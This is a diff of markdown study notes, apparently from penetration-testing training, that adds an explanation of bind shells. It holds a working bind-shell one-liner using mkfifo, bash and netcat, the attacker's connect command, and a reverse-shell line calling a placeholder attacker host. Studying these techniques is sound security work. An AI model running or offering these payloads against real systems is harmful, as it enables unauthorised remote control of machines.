@@ -47,5 +47,44 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_P
 
 As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.
 
+- **Bind shell:** Target opens (binds) a port and listens; attacker connects to it to get a shell.
+- **Use case:** When the target **cannot make outbound connections**.
+- **Downside:** Easier to detect since it listens on an open port.
+
 This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.
 
+**Bind Shell Payload (run on target):**
+
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+ `rm -f /tmp/f` → Removes existing pipe
+`mkfifo /tmp/f` → Creates FIFO for two-way communication
+
+`cat /tmp/f` → Reads attacker input
+    
+- `| bash -i 2>&1` → Interactive shell with error/output redirection
+    
+- `| nc -l 0.0.0.0 8080` → Netcat listens on all interfaces, port 8080
+    
+- `>/tmp/f` → Sends output back into the pipe
+    
+
+> Ports **<1024 require root**, so 8080 avoids privilege issues.
+
+---
+
+**Attacker connects:**
+
+`nc -nv TARGET_IP 8080`
+
+- `-n` → No DNS
+    
+- `-v` → Verbose
+    
+- Connects to the listening bind shell
+    
+
+**Result:**  
+Attacker gets an interactive shell on the target system.
